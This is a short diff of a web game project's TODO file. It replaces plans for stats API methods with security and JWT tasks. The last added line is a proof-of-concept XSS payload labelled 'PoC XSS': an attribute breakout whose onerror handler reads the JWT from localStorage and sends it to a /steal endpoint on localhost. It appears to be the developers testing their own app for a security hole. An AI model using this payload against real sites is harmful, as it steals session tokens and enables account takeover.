@@ -1,15 +1,12 @@
 ## TODO ##
 
-** Plusieurs method **
-une methode get pour:
-    - game won
-    - game loose
-    - game played
-    - winrate
+Check TODO comment to update with the new jwt
+		//TODO: update with new jwt containing only ID
 
-une methode get pour:
-    - historique des 10 dernieres parties
+Change to https
 
-ume methode post :
-    enregistre les stats d une  game
-    
+checkmark of we ve done according to the subject
+
+
+PoC XSS
+"><img src=x onerror="fetch('http://localhost:8080/steal?jwt='+encodeURIComponent(localStorage.getItem('token')))"><div class="
